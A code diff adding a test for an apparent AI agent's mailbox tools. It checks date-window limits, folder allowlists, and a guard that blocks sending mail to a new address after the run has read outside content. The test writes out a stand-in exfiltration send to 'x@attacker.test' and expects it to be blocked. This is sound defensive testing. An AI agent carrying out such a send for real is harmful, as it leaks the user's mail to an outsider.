@@ -567,6 +567,66 @@ describe("a send goes through the outbox", () => {
   );
 });
 
+describe("the mailbox's policy holds on every path", () => {
+  test(
+    "a message without a readable date is outside a day window; folder names raise A; the drafts and trash folders follow the folder list",
+    async () => {
+      clear();
+      const { lia, ana, url, connect, runOf } = await team();
+      const account = (await connect()).body.account;
+      await call(ana, "PUT", url(`/agents/${lia.id}/mail/${account.id}`), {
+        level: "read_write",
+        deletable: true,
+        policy: {
+          lookbackDays: 30,
+          folders: ["INBOX"],
+          recipientAllowlist: ["@client.test"],
+          autoSend: true,
+        },
+      });
+      const undated = `From: joao@client.test\r\nTo: ${mail.user}\r\nSubject: Old\r\nMessage-ID: <old@client.test>\r\n\r\nAncient text\r\n`;
+      const uid = mail.deliver("INBOX", undated);
+      const r = await runOf({ decide: () => "approved" });
+      expect((await r.ask("mail_read", { account: mail.user, uid })).content).toContain(
+        "outside what you can read",
+      );
+
+      // The server's folder names are outside content: after listing them, a new address is denied.
+      const lister = await runOf({ decide: () => "approved" });
+      const listed = await lister.ask("mail_folders", { account: mail.user });
+      expect(listed.content).toBe("INBOX (inbox)");
+      const exfil = await lister.ask("mail_send", {
+        account: mail.user,
+        to: ["x@attacker.test"],
+        subject: "a",
+        text: "b",
+      });
+      expect(exfil.content).toContain("Blocked: this run read content from outside (mail_folders ");
+
+      // With the list holding only INBOX, a draft can't go to Drafts nor a message to Trash.
+      const fresh = await runOf({ decide: () => "approved" });
+      expect(
+        (
+          await fresh.ask("mail_draft", {
+            account: mail.user,
+            to: ["joao@client.test"],
+            subject: "x",
+            text: "y",
+          })
+        ).content,
+      ).toContain("The folder Drafts is not available");
+      mail.deliver("INBOX", incoming("joao@client.test", "Fresh", "New text"));
+      const fresh2 = Number(mail.folders.get("INBOX")?.messages.at(-1)?.uid);
+      expect((await fresh.ask("mail_delete", { account: mail.user, uid: fresh2 })).content).toContain(
+        "The folder Trash is not available",
+      );
+      expect(mail.folders.get("Drafts")?.messages ?? []).toEqual([]);
+      expect(mail.folders.get("Trash")?.messages ?? []).toEqual([]);
+    },
+    SERVER_TEST_MS,
+  );
+});
+
 describe("whose mailbox and which channel", () => {
   test(
     "only the agent's own mailbox of its workspace; a channel rule turns it off, leaves it read-only or makes writes ask",
